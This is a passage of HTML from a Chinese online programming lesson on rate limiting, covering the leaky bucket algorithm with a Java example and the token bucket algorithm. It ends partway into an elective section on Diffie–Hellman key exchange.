data-first-offset="true"><span class="se-d5626bec" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">损失了精度，但却降低了空间复杂度</span></span></span></span><span data-slate-object="text" 
data-key="2019"><span data-slate-leaf="true" data-offset-key="2019:0" data-first-offset="true"><span 
data-slate-string="true">。</span></span></span> </div> <div class="se-0f933f14 " data-slate-type="paragraph" 
data-slate-object="block" data-key="2020"> <span data-slate-object="text" data-key="2021"><span 
data-slate-leaf="true" data-offset-key="2021:0" data-first-offset="true"><span data-slate-string="true">好，规则已经做到严格匹配了，可是在实际应用中，在很多情况下，这还是有问题。为什么呢？</span></span></span> 
</div> <h3 class="se-48fb789f" data-slate-type="heading" data-slate-object="block" data-key="2022"><span 
data-slate-object="text" data-key="2023"><span data-slate-leaf="true" data-offset-key="2023:0" 
data-first-offset="true"><span data-slate-string="true">细化控制粒度</span></span></span></h3> <div 
class="se-71e13cbf " data-slate-type="paragraph" data-slate-object="block" data-key="2024"> 
<span data-slate-object="text" data-key="2025"><span data-slate-leaf="true" data-offset-key="2025:0" 
data-first-offset="true"><span data-slate-string="true">这要从流量控制的动机说起，</span></span></span><span 
data-slate-object="text" data-key="2026"><span data-slate-leaf="true" data-offset-key="2026:0" 
data-first-offset="true"><span class="se-09483f07" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">我们建立流量控制这个系统的目的，是为了避免对于系统的冲击，而无论使用固定窗口，还是滑动窗口，根据当前的规则，我们都只能限定这个一分钟窗口内的流量符合要求，却不能做到更细粒度的控制。</span></span></span></span> 
</div> <div class="se-503a801f " data-slate-type="paragraph" data-slate-object="block" data-key="2027"> 
<span data-slate-object="text" data-key="2028"><span data-slate-leaf="true" data-offset-key="2028:0" 
data-first-offset="true"><span data-slate-string="true">举个极端的例子，一分钟内这一万个请求，如果均匀地分布在这一分钟的窗口中，系统很可能就不会出问题；但如果这一万个请求，全部集中在最开始的一秒钟内，系统就压垮了，这样的流量控制就没有起到有效的防御作用了。</span></span></span> 
</div> <div class="se-8a87aa7f " data-slate-type="paragraph" data-slate-object="block" data-key="2029"> 
<span data-slate-object="text" data-key="2030"><span data-slate-leaf="true" data-offset-key="2030:0" 
data-first-offset="true"><span data-slate-string="true">那好，如果我们要做到系统可以接受的更细的粒度。举例来说，如果我们可以做到按秒控制，那么继续按照 
10000 个 / 分钟来计算的话，这个限制就可以换算成不要超过 10000/60 ≈ 167 个 / 秒。</span></span></span> </div> <h3 class="se-18e53bec" 
data-slate-type="heading" data-slate-object="block" data-key="2031"><span data-slate-object="text" 
data-key="2032"><span data-slate-leaf="true" data-offset-key="2032:0" data-first-offset="true"><span 
data-slate-string="true">漏桶算法</span></span></span></h3> <div class="se-9e478c14 " data-slate-type="paragraph" 
data-slate-object="block" data-key="2033"> <span data-slate-object="text" data-key="2034"><span 
data-slate-leaf="true" data-offset-key="2034:0" data-first-offset="true"><span data-slate-string="true">漏桶（Leaky 
Bucket）算法就是可以带来更细粒度控制的限流算法，它的粒度取决于系统所支持的准确最小时间间隔，比如毫秒。</span></span></span> </div> <div class="se-d13cf629 
" data-slate-type="paragraph" data-slate-object="block" data-key="2035"> <span data-slate-object="text" 
data-key="2036"><span data-slate-leaf="true" data-offset-key="2036:0" data-first-offset="true"><span 
data-slate-string="true">你可以想象一个有缺漏的桶，无论我们怎样往里面放水（发送请求），水都有可能以两种方式从桶中排出来：</span></span></span> 
</div> <div class="se-d05e2dfa" data-slate-type="list" data-slate-object="block" data-key="2037"> 
<div class="se-9d67b681 se-d5f47721" data-slate-type="list-line" data-slate-object="block" 
data-key="2038"> <span data-slate-object="text" data-key="2039"><span data-slate-leaf="true" 
data-offset-key="2039:0" data-first-offset="true"><span data-slate-string="true">从漏口往外流，如果桶中有水，这个流速是一定的（这就是</span></span></span><span 
data-slate-object="text" data-key="2040"><span data-slate-leaf="true" data-offset-key="2040:0" 
data-first-offset="true"><span class="se-37233437" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">系统满载时，限流的流速</span></span></span></span><span data-slate-object="text" 
data-key="2041"><span data-slate-leaf="true" data-offset-key="2041:0" data-first-offset="true"><span 
data-slate-string="true">）；</span></span></span> </div> <div class="se-e386bbe8 se-8ef33094" 
data-slate-type="list-line" data-slate-object="block" data-key="2042"> <span data-slate-object="text" 
data-key="2043"><span data-slate-leaf="true" data-offset-key="2043:0" data-first-offset="true"><span 
data-slate-string="true">注水太快，水从桶中溢出（这就是</span></span></span><span data-slate-object="text" 
data-key="2044"><span data-slate-leaf="true" data-offset-key="2044:0" data-first-offset="true"><span 
class="se-1ddea2d8" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">请求被拒绝了，限流效果产生</span></span></span></span><span 
data-slate-object="text" data-key="2045"><span data-slate-leaf="true" data-offset-key="2045:0" 
data-first-offset="true"><span data-slate-string="true">）。</span></span></span> </div> </div> 
<div class="se-446ed24b " data-slate-type="paragraph" data-slate-object="block" data-key="2046"> 
<span data-slate-object="text" data-key="2047"><span data-slate-leaf="true" data-offset-key="2047:0" 
data-first-offset="true"><span data-slate-string="true">另外，由于请求的最小单位是一个，因此桶的大小不得小于 1。我们要求请求发送的速度不得小于漏水的速度，但我们更多时候会设置一定的桶容量，这就意味着系统允许一定程度的富余以应对突发量。这个桶大小，也就是突发量，被称为 
burst。</span></span></span> </div> <div class="se-0ef837ff " data-slate-type="paragraph" data-slate-object="block" 
data-key="2048"> <span data-slate-object="text" data-key="2049"><span data-slate-leaf="true" 
data-offset-key="2049:0" data-first-offset="true"><span data-slate-string="true">于是，我们每次都可以根据流速以及上一次的流量检测时间，获知在考虑漏水的情况下，如果接纳当前请求，那么桶中将达到怎样的水位，是否会超过 
burst。如果不超过，就允许此次访问，反之拒绝。参考代码如下：</span></span></span> </div> <div class="se-9ea343e2 se-69f64656" 
data-slate-type="pre" data-slate-object="block" data-key="2050" data-code-language="java"> 
<div class="se-9f1a86a2 se-f563a5c7"> <span></span> </div> <div class="se-1eb67b0d"> <div class="se-866681fc 
se-ec9336de" data-code-line-number="1"></div> <div class="se-866681fc se-ec9336de" data-code-line-number="2"></div> 
<div class="se-866681fc se-ec9336de" data-code-line-number="3"></div> <div class="se-866681fc 
se-ec9336de" data-code-line-number="4"></div> <div class="se-866681fc se-ec9336de" data-code-line-number="5"></div> 
<div class="se-866681fc se-ec9336de" data-code-line-number="6"></div> <div class="se-866681fc 
se-ec9336de" data-code-line-number="7"></div> <div class="se-866681fc se-ec9336de" data-code-line-number="8"></div> 
<div class="se-866681fc se-ec9336de" data-code-line-number="9"></div> <div class="se-866681fc 
se-ec9336de" data-code-line-number="10"></div> <div class="se-866681fc se-ec9336de" data-code-line-number="11"></div> 
<div class="se-866681fc se-ec9336de" data-code-line-number="12"></div> <div class="se-866681fc 
se-ec9336de" data-code-line-number="13"></div> <div class="se-866681fc se-ec9336de" data-code-line-number="14"></div> 
<div class="se-866681fc se-ec9336de" data-code-line-number="15"></div> <div class="se-866681fc 
se-ec9336de" data-code-line-number="16"></div> <div class="se-866681fc se-ec9336de" data-code-line-number="17"></div> 
<div class="se-866681fc se-ec9336de" data-code-line-number="18"></div> </div> <div class="se-f778fb82 
ps ps--active-x"> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2051"> <span data-slate-object="text" data-key="2052"><span data-slate-leaf="true" 
data-offset-key="2052:0" data-first-offset="true"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0792569464" data-annotation-type="annotation"><span data-slate-string="true">public</span></span></span><span 
data-slate-leaf="true" data-offset-key="2052:1"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2052:2"><span class=" gkhl-class" data-slate-object="annotation" 
data-annotation-key="gkann_3800551680" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_5465307538" data-annotation-type="annotation"><span 
data-slate-string="true">class</span></span></span></span><span data-slate-leaf="true" data-offset-key="2052:3"><span 
class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_3800551680" data-annotation-type="annotation"><span 
data-slate-string="true"> </span></span></span><span data-slate-leaf="true" data-offset-key="2052:4"><span 
class=" gkhl-title" data-slate-object="annotation" data-annotation-key="gkann_5010852316" data-annotation-type="annotation"><span 
class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_3800551680" data-annotation-type="annotation"><span 
data-slate-string="true">RateLimiter</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="2052:5"><span class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_3800551680" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="2052:6"><span data-slate-string="true">{</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2053"> <span data-slate-object="text" data-key="2054"><span data-slate-leaf="true" 
data-offset-key="2054:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2054:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0407688507" data-annotation-type="annotation"><span data-slate-string="true">private</span></span></span><span 
data-slate-leaf="true" data-offset-key="2054:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2054:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_6644218720" data-annotation-type="annotation"><span data-slate-string="true">float</span></span></span><span 
data-slate-leaf="true" data-offset-key="2054:4"><span data-slate-string="true"> leakingRate 
= </span></span><span data-slate-leaf="true" data-offset-key="2054:5"><span class=" gkhl-number" 
data-slate-object="annotation" data-annotation-key="gkann_4418171106" data-annotation-type="annotation"><span 
data-slate-string="true">10000f</span></span></span><span data-slate-leaf="true" data-offset-key="2054:6"><span 
data-slate-string="true">/</span></span><span data-slate-leaf="true" data-offset-key="2054:7"><span 
class=" gkhl-number" data-slate-object="annotation" data-annotation-key="gkann_4257506384" 
data-annotation-type="annotation"><span data-slate-string="true">60</span></span></span><span 
data-slate-leaf="true" data-offset-key="2054:8"><span data-slate-string="true">/</span></span><span 
data-slate-leaf="true" data-offset-key="2054:9"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_7038378993" data-annotation-type="annotation"><span data-slate-string="true">1000</span></span></span><span 
data-slate-leaf="true" data-offset-key="2054:10"><span data-slate-string="true">; </span></span><span 
data-slate-leaf="true" data-offset-key="2054:11"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_4394938738" data-annotation-type="annotation"><span data-slate-string="true">// 
每一毫秒能够漏掉的水</span></span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" 
data-slate-object="block" data-key="2055"> <span data-slate-object="text" data-key="2056"><span 
data-slate-leaf="true" data-offset-key="2056:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="2056:1"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_4714137648" data-annotation-type="annotation"><span 
data-slate-string="true">private</span></span></span><span data-slate-leaf="true" data-offset-key="2056:2"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="2056:3"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_0968084263" 
data-annotation-type="annotation"><span data-slate-string="true">float</span></span></span><span 
data-slate-leaf="true" data-offset-key="2056:4"><span data-slate-string="true"> remaining = 
</span></span><span data-slate-leaf="true" data-offset-key="2056:5"><span class=" gkhl-number" 
data-slate-object="annotation" data-annotation-key="gkann_5497958380" data-annotation-type="annotation"><span 
data-slate-string="true">0</span></span></span><span data-slate-leaf="true" data-offset-key="2056:6"><span 
data-slate-string="true">; </span></span><span data-slate-leaf="true" data-offset-key="2056:7"><span 
class=" gkhl-comment" data-slate-object="annotation" data-annotation-key="gkann_7186366956" 
data-annotation-type="annotation"><span data-slate-string="true">// 桶中余下的水</span></span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2057"> <span data-slate-object="text" data-key="2058"><span data-slate-leaf="true" 
data-offset-key="2058:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2058:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3972587850" data-annotation-type="annotation"><span data-slate-string="true">private</span></span></span><span 
data-slate-leaf="true" data-offset-key="2058:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2058:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_6409746364" data-annotation-type="annotation"><span data-slate-string="true">float</span></span></span><span 
data-slate-leaf="true" data-offset-key="2058:4"><span data-slate-string="true"> burst = </span></span><span 
data-slate-leaf="true" data-offset-key="2058:5"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_7568311421" data-annotation-type="annotation"><span data-slate-string="true">0</span></span></span><span 
data-slate-leaf="true" data-offset-key="2058:6"><span data-slate-string="true">; </span></span><span 
data-slate-leaf="true" data-offset-key="2058:7"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_9344630589" data-annotation-type="annotation"><span data-slate-string="true">// 
桶容量</span></span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" 
data-slate-object="block" data-key="2059"> <span data-slate-object="text" data-key="2060"><span 
data-slate-leaf="true" data-offset-key="2060:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="2060:1"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_8186775682" data-annotation-type="annotation"><span 
data-slate-string="true">private</span></span></span><span data-slate-leaf="true" data-offset-key="2060:2"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="2060:3"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_2477337573" 
data-annotation-type="annotation"><span data-slate-string="true">long</span></span></span><span 
data-slate-leaf="true" data-offset-key="2060:4"><span data-slate-string="true"> lastTime = 
System.currentTimeMillis(); </span></span><span data-slate-leaf="true" data-offset-key="2060:5"><span 
class=" gkhl-comment" data-slate-object="annotation" data-annotation-key="gkann_9240701825" 
data-annotation-type="annotation"><span data-slate-string="true">// 最近一次流量检测时间</span></span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2061"> <span data-slate-object="text" data-key="2062"><span data-slate-leaf="true" 
data-offset-key="2062:0" data-first-offset="true"><span data-slate-string="true"> </span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2063"> <span data-slate-object="text" data-key="2064"><span data-slate-leaf="true" 
data-offset-key="2064:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2064:1"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0766360156" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_8803303957" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="2064:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_0766360156" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="2064:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1256806138" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_0766360156" data-annotation-type="annotation"><span 
data-slate-string="true">boolean</span></span></span></span><span data-slate-leaf="true" data-offset-key="2064:4"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_0766360156" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="2064:5"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0766360156" data-annotation-type="annotation"><span class=" gkhl-title" 
data-slate-object="annotation" data-annotation-key="gkann_8818920668" data-annotation-type="annotation"><span 
data-slate-string="true">isAllowed</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="2064:6"><span class=" gkhl-params" data-slate-object="annotation" data-annotation-key="gkann_8888809554" 
data-annotation-type="annotation"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0766360156" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="2064:7"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0766360156" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="2064:8"><span data-slate-string="true">{</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2065"> <span data-slate-object="text" data-key="2066"><span data-slate-leaf="true" 
data-offset-key="2066:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2066:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9067333840" data-annotation-type="annotation"><span data-slate-string="true">long</span></span></span><span 
data-slate-leaf="true" data-offset-key="2066:2"><span data-slate-string="true"> now = System.currentTimeMillis();</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2067"> <span data-slate-object="text" data-key="2068"><span data-slate-leaf="true" 
data-offset-key="2068:0" data-first-offset="true"><span data-slate-string="true"> remaining 
= Math.max(</span></span><span data-slate-leaf="true" data-offset-key="2068:1"><span class=" 
gkhl-number" data-slate-object="annotation" data-annotation-key="gkann_3625306621" data-annotation-type="annotation"><span 
data-slate-string="true">0</span></span></span><span data-slate-leaf="true" data-offset-key="2068:2"><span 
data-slate-string="true">, remaining - (now-lastTime)*leakingRate); </span></span><span data-slate-leaf="true" 
data-offset-key="2068:3"><span class=" gkhl-comment" data-slate-object="annotation" data-annotation-key="gkann_7582256112" 
data-annotation-type="annotation"><span data-slate-string="true">// 如果漏完了，余下的就是 0，不能出现负数</span></span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2069"> <span data-slate-object="text" data-key="2070"><span data-slate-leaf="true" 
data-offset-key="2070:0" data-first-offset="true"><span data-slate-string="true"> lastTime 
= now;</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" 
data-slate-object="block" data-key="2071"> <span data-slate-object="text" data-key="2072"><span 
data-slate-leaf="true" data-offset-key="2072:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" 
data-slate-object="block" data-key="2073"> <span data-slate-object="text" data-key="2074"><span 
data-slate-leaf="true" data-offset-key="2074:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="2074:1"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_9931940254" data-annotation-type="annotation"><span 
data-slate-string="true">if</span></span></span><span data-slate-leaf="true" data-offset-key="2074:2"><span 
data-slate-string="true"> (remaining+</span></span><span data-slate-leaf="true" data-offset-key="2074:3"><span 
class=" gkhl-number" data-slate-object="annotation" data-annotation-key="gkann_5926050708" 
data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span><span 
data-slate-leaf="true" data-offset-key="2074:4"><span data-slate-string="true"> &lt;= burst) 
{</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" 
data-slate-object="block" data-key="2075"> <span data-slate-object="text" data-key="2076"><span 
data-slate-leaf="true" data-offset-key="2076:0" data-first-offset="true"><span data-slate-string="true"> 
remaining++;</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" 
data-slate-object="block" data-key="2077"> <span data-slate-object="text" data-key="2078"><span 
data-slate-leaf="true" data-offset-key="2078:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="2078:1"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_7741676340" data-annotation-type="annotation"><span 
data-slate-string="true">return</span></span></span><span data-slate-leaf="true" data-offset-key="2078:2"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="2078:3"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_3494364179" 
data-annotation-type="annotation"><span data-slate-string="true">true</span></span></span><span 
data-slate-leaf="true" data-offset-key="2078:4"><span data-slate-string="true">;</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2079"> <span data-slate-object="text" data-key="2080"><span data-slate-leaf="true" 
data-offset-key="2080:0" data-first-offset="true"><span data-slate-string="true"> }</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2081"> <span data-slate-object="text" data-key="2082"><span data-slate-leaf="true" 
data-offset-key="2082:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2082:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3225730350" data-annotation-type="annotation"><span data-slate-string="true">return</span></span></span><span 
data-slate-leaf="true" data-offset-key="2082:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2082:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3307354592" data-annotation-type="annotation"><span data-slate-string="true">false</span></span></span><span 
data-slate-leaf="true" data-offset-key="2082:4"><span data-slate-string="true">;</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2083"> <span data-slate-object="text" data-key="2084"><span data-slate-leaf="true" 
data-offset-key="2084:0" data-first-offset="true"><span data-slate-string="true"> }</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2085"> <span data-slate-object="text" data-key="2086"><span data-slate-leaf="true" 
data-offset-key="2086:0" data-first-offset="true"><span data-slate-string="true">}</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 158px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-0179a8e6 " data-slate-type="paragraph" data-slate-object="block" 
data-key="2087"> <span data-slate-object="text" data-key="2088"><span data-slate-leaf="true" 
data-offset-key="2088:0" data-first-offset="true"><span data-slate-string="true">从复杂度上你也可以看到，我们通过变量 
remaining 记录每一个请求到达的时刻，桶中水的余量，整个空间复杂度是常量级的。当然了，我们的控制已经不是针对“一分钟规则”了，控制粒度上更加细化，更符合我们对系统保护的实际要求，因此这个方法的应用更广。</span></span></span> 
</div> <h3 class="se-e6e25013" data-slate-type="heading" data-slate-object="block" data-key="2089"><span 
data-slate-object="text" data-key="2090"><span data-slate-leaf="true" data-offset-key="2090:0" 
data-first-offset="true"><span data-slate-string="true">令牌桶算法</span></span></span></h3> <div 
class="se-43ee1b2d " data-slate-type="paragraph" data-slate-object="block" data-key="2091"> 
<span data-slate-object="text" data-key="2092"><span data-slate-leaf="true" data-offset-key="2092:0" 
data-first-offset="true"><span data-slate-string="true">还有一种和漏桶算法本质上一致，但是实现上有所不同的方法，叫做令牌桶（Token 
Bucket）算法。说它们实现上不同是因为，漏桶是不断往外漏水，看能不能把陆续到来的请求给消耗掉；而令牌桶呢，则是在令牌桶内会定期放入令牌，每一个请求到来，都要去令牌桶内取令牌，取得了才可以继续访问系统，否则就会被流量控制系统拒绝掉。</span></span></span> 
</div> <div class="se-7b1bff80 " data-slate-type="paragraph" data-slate-object="block" data-key="2093"> 
<span data-slate-object="text" data-key="2094"><span data-slate-leaf="true" data-offset-key="2094:0" 
data-first-offset="true"><span data-slate-string="true">就像我们的问题，每 60*1000/10000 = 6 毫秒就要向令牌桶内放置一个令牌。和前面的漏桶算法一样，我们并不一定要真的建立一个放入令牌的线程来做这个放入令牌的工作，而是使用和上面类似的算法，在请求到来的时候，根据上次剩余的令牌数和上次之后流逝的时间，计算当前桶内是否还有完整的一张令牌，如果没有令牌，就拒绝请求，否则允许请求。因此，从这个角度说，漏桶和令牌桶这二者在思想本质上是一致的。</span></span></span> 
</div> <h2 class="se-29b63198" data-slate-type="heading" data-slate-object="block" data-key="2095"><span 
data-slate-object="text" data-key="2096"><span data-slate-leaf="true" data-offset-key="2096:0" 
data-first-offset="true"><span data-slate-string="true">总结思考</span></span></span></h2> <div 
class="se-1d1e7850 " data-slate-type="paragraph" data-slate-object="block" data-key="2097"> 
<span data-slate-object="text" data-key="2098"><span data-slate-leaf="true" data-offset-key="2098:0" 
data-first-offset="true"><span data-slate-string="true">今天我通过一个常见的流量控制系统，向你介绍了全栈开发中几个典型的算法，包括基于固定时间窗口的简单计数法，滑动时间窗口的队列法，还有实际应用中更为常见的漏桶算法和令牌桶算法。希望通过今天的学习，你已经理解了它们的工作原理。</span></span></span> 
</div> <div class="se-ffe2bb08 " data-slate-type="paragraph" data-slate-object="block" data-key="2099"> 
<span data-slate-object="text" data-key="2100"><span data-slate-leaf="true" data-offset-key="2100:0" 
data-first-offset="true"><span data-slate-string="true">现在我来提两个问题吧：</span></span></span> </div> 
<div class="se-e230d9ec" data-slate-type="list" data-slate-object="block" data-key="2101"> 
<div class="se-9b43f5d7 se-44bc53b1" data-slate-type="list-line" data-slate-object="block" 
data-key="2102"> <span data-slate-object="text" data-key="2103"><span data-slate-leaf="true" 
data-offset-key="2103:0" data-first-offset="true"><span data-slate-string="true">漏桶算法我给出了示例代码，而具有一定相似性的令牌桶算法我没有给出示例代码，如果你理解了这两者，能否写出令牌桶算法的代码呢？</span></span></span> 
</div> <div class="se-13ce6e3f se-5a17d6fc" data-slate-type="list-line" data-slate-object="block" 
data-key="2104"> <span data-slate-object="text" data-key="2105"><span data-slate-leaf="true" 
data-offset-key="2105:0" data-first-offset="true"><span data-slate-string="true">为了简化问题，我在一开始的时候讲了，我们不考虑并发的问题。现在，如果我们把上面无论哪一种算法的代码，改成支持多个线程并发访问的情形，即要求保证线程安全，你觉得需要对代码做怎样的修改呢？</span></span></span> 
</div> </div> <h2 class="se-ddd600b4" data-slate-type="heading" data-slate-object="block" data-key="2106"><span 
data-slate-object="text" data-key="2107"><span data-slate-leaf="true" data-offset-key="2107:0" 
data-first-offset="true"><span data-slate-string="true">选修课堂：Diffie–Hellman 密钥交换</span></span></span></h2> 
<div class="se-9a60631e " data-slate-type="paragraph" data-slate-object="block" data-key="2108"> 
<span data-slate-object="text" data-key="2109"><span data-slate-leaf="true" data-offset-key="2109:0" 
data-first-offset="true"><span data-slate-string="true">我们在 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="2110" class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" 
data-key="2111"><span data-slate-leaf="true" data-offset-key="2111:0" data-first-offset="true"><span 
data-slate-string="true">[第 02 讲]</span></span></span></a><span data-slate-object="text" data-key="2112"><span 
data-slate-leaf="true" data-offset-key="2112:0" data-first-offset="true"><span data-slate-string="true"> 
中介绍 HTTPS 加密的时候，提到了 Pre-master Secret 生成的方式，其中一种就是 Diffie–Hellman 密钥交换这一算法的变种（如有遗忘，请回看），但是，我们并没有讲其中加密具体的算法原理。那么，下面我就来看一下 
Diffie–Hellman 密钥交换，这个常见的 HTTPS 加密算法，是怎样做到</span></span></span><span data-slate-object="text" 
data-key="2113"><span data-slate-leaf="true" data-offset-key="2113:0" data-first-offset="true"><span 
class="se-8ede1eac" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">正向计算简单、逆向求解困难</span></span></span></span><span 
data-slate-object="text" data-key="2114"><span data-slate-leaf="true" data-offset-key="2114:0" 
data-first-offset="true"><span data-slate-string="true">，来保证安全性的。</span></span></span> </div> 
<h3 class="se-2ca82886" data-slate-type="heading" data-slate-object="block" data-key="2115"><span 
data-slate-object="text" data-key="2116"><span data-slate-leaf="true" data-offset-key="2116:0" 
data-first-offset="true"><span data-slate-string="true">密钥计算过程</span></span></span></h3> <div 
class="se-906ac966 " data-slate-type="paragraph" data-slate-object="block" data-key="2117"> 
<span data-slate-object="text" data-key="2118"><span data-slate-leaf="true" data-offset-key="2118:0" 
data-first-offset="true"><span data-slate-string="true">Diffie–Hellman 密钥交换是一种在非保护信道中安全地创建共享密钥方法，它的出现在如今众所周知的 
RSA 算法发明之前。现在让我们来玩一个角色扮演游戏，假设你要和我进行通信，我们就来使用这种办法安全地创建共享密钥：</span></span></span> </div> <div 
class="se-b25a026d" data-slate-type="list" data-slate-object="block" data-key="2119"> <div 
class="se-266e69ee se-ef309b0d" data-slate-type="list-line" data-slate-object="block" data-key="2120"> 
<span data-slate-object="text" data-key="2121"><span data-slate-leaf="true" data-offset-key="2121:0" 
data-first-offset="true"><span data-slate-string="true">通信的你和我都协议商定了质数 p 和另一个底数 g；</span></span></span> 
</div> <div class="se-00d834b6 se-8b750545" data-slate-type="list-line" data-slate-object="block" 
data-key="2122"> <span data-slate-object="text" data-key="2123"><span data-slate-leaf="true" 
data-offset-key="2123:0" data-first-offset="true"><span data-slate-string="true">你呢，先生成一个只有你自己知道的随机整数 
a，并将结果 A = gᵃ mod p 发给我；</span></span></span> </div> <div class="se-5952ecf1 se-652e88cb" data-slate-type="list-line" 
